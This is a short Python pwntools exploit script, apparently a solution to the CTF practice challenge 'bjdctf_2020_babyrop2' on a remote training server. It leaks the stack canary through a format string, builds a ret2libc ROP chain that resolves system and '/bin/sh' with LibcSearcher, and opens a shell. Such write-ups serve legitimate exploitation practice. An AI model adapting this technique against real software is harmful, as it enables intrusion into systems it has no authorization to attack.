from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
# 格式化字符串泄露cannary，再ret2libc
# 同时考虑到是x64，所以相当于有6个寄存器的偏移
e = ELF('./bjdctf_2020_babyrop2')
puts_plt = e.plt['puts']
puts_got = e.got['puts']
pop_rdi = 0x400993
vuln_func = 0x400887
# cannry在一次执行的过程中是不变的吗？
formatstr = b'%7$p'
io = remote('node4.buuoj.cn', 29527)
# io = process('./bjdctf_2020_babyrop2')
io.recvuntil(b'help u!\n')
io.sendline(formatstr)
cannary = int(io.recv(18).decode(), 16)
io.info(hex(cannary))

io.recvuntil(b'u story!\n')
payload1 = b'a'*(0x20-8) + p64(cannary) + p64(0xdeadbeef) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(vuln_func)

io.send(payload1)
puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

lib = LibcSearcher('puts', puts_addr)
system = lib.dump('system') + puts_addr - lib.dump('puts')
binsh = lib.dump('str_bin_sh') + puts_addr - lib.dump('puts')

payload2 = b'a'*(0x20-8) + p64(cannary) + p64(0xdeadbeef) + p64(pop_rdi) + p64(binsh) + p64(system)

io.send(payload2)
io.interactive()